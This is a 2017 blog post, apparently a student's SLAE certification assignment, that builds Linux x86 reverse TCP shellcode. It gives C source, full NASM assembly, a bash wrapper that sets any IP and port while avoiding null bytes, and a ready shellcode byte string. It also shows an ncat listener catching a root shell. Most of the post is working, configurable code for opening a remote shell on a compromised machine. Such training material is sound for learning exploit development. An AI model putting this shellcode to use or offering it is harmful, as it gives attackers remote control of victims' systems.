---
layout: post
title:  "SLAE Assignment 2 - TCP Reverse Shellcode"
date:   2017-04-19
categories: certification
excerpt_separator: <!--more-->
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  

Hello everybody,  
  
So here we are for the second part of our shellcodes serie. Today we will deal with a reverse TCP shellcode.  
This shellcode will be pretty similar to the bind one, except that we will connect back to the attacker's machine in order to provide a shell on the compromised one.  
<!--more-->
  
So let's see what changed.  
  
### Assignment 2:  

Code is available on my [github repo](https://github.com/phackt/slae/tree/master/assignment2).  
  
**Our Goal:**  
> *Create a Shell_Reverse_TCP shellcode:*
 - *reverse connects to IP and PORT and spawns a shell*
 - *easily configurable IP and PORT*

Here is the C source code we used:  
```c
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int clientfd, sockfd, ret;
        int dstport = 8080;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport); //8080
        mysockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //localhost
 
        // connecting to attacker's machine
        ret = connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(struct sockaddr_in));
        if(ret == -1)
        {
                perror("Attacker's machine is not listening. Quitting!");
                exit(-1);
        }

        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}
```
  
Let's listen on port 8080:  
```bash
ncat -klvp 8080
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
```
  
Let's connect:  
```bash
# gcc -fno-stack-protector -z execstack -o shell_reverse_tcp shell_reverse_tcp.c && ./shell_reverse_tcp

```
   
And we have:   
```bash
ncat -klvp 8080
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:38488.
id
uid=0(root) gid=0(root) groups=0(root)
```
  
So what are the interesting functions:  
```bash
objdump -d ./shell_reverse_tcp -M intel
...
80485d2: e8 79 fe ff ff call 8048450 <connect@plt>
...
```
  
So we have:  
```
socket
connect
dup2
execve
```
  
Let's update our previous shellcode to match our new needs:  
```nasm
; shell_bind_tcp.nasm
; 
; A TCP port bind shellcode
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction

global  _start

section .text
_start:

; sockfd = socket(AF_INET, SOCK_STREAM, 0);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_SOCKET        1
    xor ebx,ebx
    mul ebx         ; zero out eax and edx
    mov al, 102     ; __NR_socketcall
    mov bl, 1       ; SYS_SOCKET
    
    ; we are pushing on the stack our arguments
    push edx        ; IPPROTO_IP
    push byte 1     ; SOCK_STREAM
    push byte 2     ; AF_INET
    
    mov ecx, esp    ; the top of the stack points to a structure of 3 arguments
    int 0x80        ; syscall - result is stored in eax
    mov edi, eax    ; stores sockfd

; ret = connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(struct sockaddr_in));
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_CONNECT       3
    
    push edx
    mov byte [esp], 0x7f    ; mysockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //localhost
    mov byte [esp+3], 0x01  ; useful to avoid null bytes in the IP address

    push word 0x901f  ; mysockaddr.sin_port = htons(dstport); //8080
    push word 2     ; AF_INET
    mov ebx, esp    ; stores the address of mysockaddr
    push byte 16    ; length of mysockaddr
    push ebx        ; pointer to mysockaddr
    push edi        ; sockfd

    xor ebx, ebx    ; flushing registers
    mul ebx
    mov al, 102     ; __NR_socketcall
    mov bl, 3       ; SYS_CONNECT
    mov ecx, esp    ; pointer to the args for socketcall
    int 0x80



; int dup2(int oldfd, int newfd); duplicates a file descriptor
; dup2(sockfd, 0); 
; dup2(sockfd, 1);
; dup2(sockfd, 2);
; #define __NR_dup2 63

    mov ebx, edi    ; sockfd as first argument
    xor ecx, ecx
    mov cl, 2       ; 2 for stderr / 1 for stdout / 0 for stdin
    xor eax, eax

dup2:
    mov al, 63      ; __NR_dup2
    int 0x80
    dec ecx
    jns dup2        ; jump short if not signed 

; execve("/bin/sh", NULL, NULL);
; #define __NR_execve 11

    xor eax,eax
    push eax
    push 0x68732f2f ; hs// - take care to the little endian representation
    push 0x6e69622f ; nib/
    mov ebx, esp    ; pointer to command string
    mov ecx, eax
    mov edx, eax
    mov al, 11      ; __NR_execve
    int 0x80
```  
  
Let's compile, run and see if we are receiving our connection back:  
![image1]({{ site.url }}/public/images/slae/assignment2/image1.png)  
  
Perfect, and what about the bad characters:  
```bash
objdump -d ./shell_reverse_tcp -M intel| grep 00
```
  
Nothing, good. Let's update our [wrapper.sh](https://github.com/phackt/slae/blob/master/assignment2/wrapper.sh) script and create our [shell_reverse_tcp.template](https://github.com/phackt/slae/blob/master/assignment2/shell_reverse_tcp.template) file. Please click and check the sources on Github.  

The wrapper.sh and the template file have been enhanced in order to avoid null bytes in port number and IP address:    
```bash
#! /bin/bash

#####################################
# Displays help
#####################################
function help(){
    echo "Usage: $0 <ip> <port_number> <file>"
    exit 1
}

#####################################
# Checking is root
#####################################

if [ $# -ne 3 ]; then
    help
fi

IP=$1
PORT=$2
FILE=$3

##############################
# Checking the port number
##############################

if [ ${PORT} -lt 1 ] || [ ${PORT} -gt 65535 ]; then
	echo "[*] Port number should be between 1 and 65535! Exiting..."
	exit
fi

# Converting port in hex and little endian representation
HEXFMTPORT=`printf "%04x" ${PORT}`
HEXFMTPORT1=$([ $((16#${HEXFMTPORT:0:2})) -ne 0 ] && echo 0x${HEXFMTPORT:0:2} || echo dl)
HEXFMTPORT2=$([ $((16#${HEXFMTPORT: -2})) -ne 0 ] && echo 0x${HEXFMTPORT: -2}	 || echo dl)

# final nasm filename
NASM_FILENAME=${FILE%.*}.nasm

########################
# Splitting IP address
########################
IP1=`echo ${IP} | cut -d. -f1`
IP2=`echo ${IP} | cut -d. -f2`
IP3=`echo ${IP} | cut -d. -f3`
IP4=`echo ${IP} | cut -d. -f4`

# Converting IP in hex and little endian representation
HEXFMTIP1=$([ ${IP1} -ne 0 ] && echo `printf "0x%x" ${IP1}` || echo dl)
HEXFMTIP2=$([ ${IP2} -ne 0 ] && echo `printf "0x%x" ${IP2}` || echo dl)
HEXFMTIP3=$([ ${IP3} -ne 0 ] && echo `printf "0x%x" ${IP3}` || echo dl)
HEXFMTIP4=$([ ${IP4} -ne 0 ] && echo `printf "0x%x" ${IP4}` || echo dl)

# for debugging purpose
echo "----------------------------"
echo "[*] HEXFMTPORT:${HEXFMTPORT}"
echo "[*] HEXFMTPORT1:${HEXFMTPORT1}"
echo "[*] HEXFMTPORT2:${HEXFMTPORT2}"
echo "[*] HEXFMTIP1:${HEXFMTIP1}"
echo "[*] HEXFMTIP2:${HEXFMTIP2}"
echo "[*] HEXFMTIP3:${HEXFMTIP3}"
echo "[*] HEXFMTIP4:${HEXFMTIP4}"
echo "----------------------------"
echo

# Replacing port and ip patterns
# Generating a new file source and compiling
sed "s/PORT1/${HEXFMTPORT1}/" ${FILE} > ${NASM_FILENAME} && \
sed -i "s/PORT2/${HEXFMTPORT2}/" ${NASM_FILENAME} && \
sed -i "s/IP1/${HEXFMTIP1}/" ${NASM_FILENAME} && \
sed -i "s/IP2/${HEXFMTIP2}/" ${NASM_FILENAME} && \
sed -i "s/IP3/${HEXFMTIP3}/" ${NASM_FILENAME} && \
sed -i "s/IP4/${HEXFMTIP4}/" ${NASM_FILENAME} && \
./compile.sh ${FILE%.*} && \
objdump -d ${FILE%.*}|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
  
Trying with a port (2048 = 0x0800) and IP (127.0.0.1) which are generating some null bytes provides the following:  
```bash
./wrapper.sh 127.0.0.1 2048 ./shell_reverse_tcp.template 
----------------------------
[*] HEXFMTPORT:0800
[*] HEXFMTPORT1:0x08
[*] HEXFMTPORT2:dl
[*] HEXFMTIP1:0x7f
[*] HEXFMTIP2:dl
[*] HEXFMTIP3:dl
[*] HEXFMTIP4:0x1
----------------------------

[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\xc6\x04\x24\x7f\x88\x54\x24\x01\x88\x54\x24\x02\xc6\x44\x24\x03\x01\x66\x52\xc6\x04\x24\x08\x88\x54\x24\x01\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xfb\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```

Here is the interesting part in our template:  
```nasm
...
    push edx
    mov byte [esp], IP1    ; useful to avoid null bytes with parametrized IP
    mov byte [esp+1], IP2  ; If 00 will be replaced by dl
    mov byte [esp+2], IP3     
    mov byte [esp+3], IP4

    push dx                  ; useful to avoid null bytes with parametrized port
    mov byte [esp], PORT1    ; mysockaddr.sin_port = htons(dstport); //8080
    mov byte [esp+1], PORT2 
...
```
  
And have a look at the result shell_reverse_tcp.nasm file:  
```nasm
...
    push edx
    mov byte [esp], 0x7f    ; useful to avoid null bytes with parametrized IP
    mov byte [esp+1], dl  ; If 00 will be replaced by dl
    mov byte [esp+2], dl     
    mov byte [esp+3], 0x1

    push dx                  ; useful to avoid null bytes with parametrized port
    mov byte [esp], 0x08    ; mysockaddr.sin_port = htons(dstport); //8080
    mov byte [esp+1], dl 
...
```
  
We are pushing the *dl* byte register in replacement of a null byte.  
  
So now let's confirm that the generated nasm source file leads to a working shellcode once compiled thanks to [shellcode.c](https://github.com/phackt/slae/tree/master/assignment2/shellcode.c):  
```bash
# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c && ./shellcode 
Shellcode Length: 106

```
  
And here we are:  
![image2]({{ site.url }}/public/images/slae/assignment2/image2.png)  

So now we can parametrize the port number, the IP address, and you can generate a TCP reverse shellcode without any null bytes.  
  
Hope you enjoyed,  
Don't hesitate to comment and share.  
  
[Phackt](https://twitter.com/phackt_ul)

